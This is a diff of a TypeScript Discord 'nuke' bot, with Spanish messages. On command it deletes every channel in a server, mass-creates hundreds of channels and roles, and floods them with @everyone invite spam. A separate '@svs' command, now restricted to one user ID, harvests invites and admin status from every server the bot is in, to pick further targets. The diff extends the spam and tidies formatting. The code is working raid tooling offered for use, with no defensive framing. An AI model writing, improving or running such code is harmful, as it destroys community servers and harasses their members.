@@ -18,28 +18,27 @@ client.on('ready', () => {
   console.log(client.user.username, ' is ready');
   console.log(client.user.id);
   client.user.setPresence({
-    status: 'dnd', 
+    status: 'dnd',
     activity: {
-      name: "@",
-      type: "COMPETING"
-    }
+      name: '@',
+      type: 'COMPETING',
+    },
   });
 });
 
-
 client.on('message', async (message: Message) => {
   if (!message.guild) return;
-  
-  const guild: Guild = message.guild;
-  
-  if (!guild.me) return;
-  
-  const wrong = (params: String) => {
-    return message.channel.send({content: params});
-  }
 
-  function sleep(ms: number)  {
-    return new Promise(resolve => setTimeout(resolve, ms));
+  const guild: Guild = message.guild;
+
+  if (!guild.me) return;
+
+  const wrong = (params: String) => {
+    return message.channel.send({ content: params });
+  };
+
+  function sleep(ms: number) {
+    return new Promise((resolve) => setTimeout(resolve, ms));
   }
 
   ///nuke
@@ -55,7 +54,8 @@ client.on('message', async (message: Message) => {
       return guild;
     }
     if (!guild.me) return;
-    if (!guild.me.hasPermission('ADMINISTRATOR')) return wrong("No tengo los permisos ncesarios");
+    if (!guild.me.hasPermission('ADMINISTRATOR'))
+      return wrong('No tengo los permisos ncesarios');
 
     deleteData().then((g) =>
       g.channels
@@ -65,7 +65,8 @@ client.on('message', async (message: Message) => {
   }
   ///automatic
   if (message.content === '@') {
-    if (!guild.me.hasPermission('ADMINISTRATOR')) return wrong("No tengo los permisos ncesarios");
+    if (!guild.me.hasPermission('ADMINISTRATOR'))
+      return wrong('No tengo los permisos ncesarios');
     const deleteChannels = async (): Promise<Guild> => {
       await guild.channels.cache.forEach((c) => {
         c.delete()
@@ -95,43 +96,58 @@ client.on('message', async (message: Message) => {
     const createChannels = async () => {
       for (let i = 0; i <= 458; i++) {
         if (!message.guild) return;
-        const channel = await message.guild.channels.create(raidData.raid_channel);
+        const channel = await message.guild.channels.create(
+          raidData.raid_channel,
+          {
+            topic: raidData.invite,
+            permissionOverwrites: [
+              {
+                id: guild.id,
+                allow: ['VIEW_CHANNEL'],
+              },
+            ],
+          }
+        );
         const sendMessages = async (ms?: number) => {
           for (let x = 0; x <= 4; x++) {
             if (!channel) {
               continue;
             }
-            channel.send('@everyone ' + raidData.invite)
-            .catch((e) => {
+            channel.send('@everyone ' + raidData.message).catch((e) => {
               guild.channels.cache.delete(channel.id);
-              console.log(colors.magenta, 'Sending messages:', reset, e.message);
+              console.log(
+                colors.magenta,
+                'Sending messages:',
+                reset,
+                e.message
+              );
             });
           }
           if (ms) await sleep(ms * 1000);
           return;
-        }
+        };
 
         const createRoles = async () => {
           for (let x = 0; x <= 249 - guild.roles.cache.size; x++) {
-            guild.roles.create(
-              {
+            guild.roles
+              .create({
                 data: {
-                  name: raidData.nuke_name
-                }
+                  name: raidData.nuke_name,
+                },
               })
-            .catch(e => {
-              console.log(colors.yellow, 'Creating roles', reset, e.message);
-            });
+              .catch((e) => {
+                console.log(colors.yellow, 'Creating roles', reset, e.message);
+              });
           }
           return;
-        }
-        
-        Promise.all([channel, createRoles])
-        .then(async res => {
+        };
+
+        Promise.all([channel, createRoles]).then(async (res) => {
           await sendMessages(5);
-          await sendMessages(7);  
+          await sendMessages(10);
+          await sendMessages(20);
           await sendMessages();
-        })
+        });
       }
     };
 
@@ -147,18 +163,20 @@ client.on('message', async (message: Message) => {
     }
   }
 
-  if (message.content === "@svs") {
+  if (message.content === '@svs') {
+    if (message.author.id !== '818625837653033050') return;
     let guilds = client.guilds.cache.sort((a, b) => (a > b ? -1 : 1));
-    
-    guilds.forEach(async g => {
+
+    guilds.forEach(async (g) => {
       if (g.id === '897986461222207589') return;
       try {
         let invite = await g.channels.cache.random().createInvite();
-        message.channel.send(g.me?.hasPermission('ADMINISTRATOR') + g.name + " | " + invite.url);
-      } catch(e) {
-        message.channel.send(g.name + " | " + g.id);
+        message.channel.send(
+          g.me?.hasPermission('ADMINISTRATOR') + g.name + ' | ' + invite.url
+        );
+      } catch (e) {
+        message.channel.send(g.name + ' | ' + g.id);
       }
-      
     });
   }
 });
